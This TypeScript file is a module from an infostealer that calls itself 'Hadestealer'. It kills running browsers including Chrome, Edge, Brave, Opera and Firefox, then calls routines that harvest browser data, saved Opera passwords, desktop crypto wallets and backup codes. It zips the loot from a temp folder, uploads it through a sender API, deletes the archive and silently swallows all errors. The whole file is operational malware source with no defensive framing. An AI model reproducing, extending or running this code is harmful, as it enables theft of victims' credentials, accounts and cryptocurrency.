import fs from 'fs';
import path from 'path';
import os from 'os';
import AdmZip from 'adm-zip';
import { sendBrowserData } from '../api/sender';
import { buildFolderSummary } from '../utils/file';
import { killProcess } from '../utils/process';
import { all } from './data';
import { opera, Operapass } from './opera';
import { getFirefoxAllData } from './firefox';
import { processBackupCodesSendAll } from '../systems/backup_codes';
import { extractDesktopWallets } from '../systems/wallet';

export async function sendBrowser(): Promise<void> {
    try {
        const browserDataPath = path.join(os.tmpdir(), 'Hadestealer');
        if (!fs.existsSync(browserDataPath)) {
            return;
        }

        const summary = buildFolderSummary(browserDataPath);

        const zip = new AdmZip();
        zip.addLocalFolder(browserDataPath);
        const zipPath = path.join(os.tmpdir(), `Hadestaler_${Date.now()}.zip`);
        zip.writeZip(zipPath);
        await sendBrowserData(zipPath, summary);

        try { fs.unlinkSync(zipPath); } catch { }
    } catch (err) {
    }
}


export async function runB(): Promise<void> {
    const browsersToKill = [
        'chrome', 'msedge', 'brave', 'opera', 'kometa', 'orbitum',
        'centbrowser', '7star', 'sputnik', 'vivaldi', 'epicprivacybrowser',
        'uran', 'yandex', 'iridium', "operagx", "firefox"
    ];

    for (const p of browsersToKill) {
        await killProcess(p).catch(() => { });
    }

    await new Promise(resolve => setTimeout(resolve, 1000));
    const browserDataPath = path.join(os.tmpdir(), 'Hadestealer');

    try {
        await all()
        await extractDesktopWallets(browserDataPath)
        await opera()
        await Operapass()
        await processBackupCodesSendAll()
        await getFirefoxAllData()
        await sendBrowser()

    } catch (totalError) {
    }
}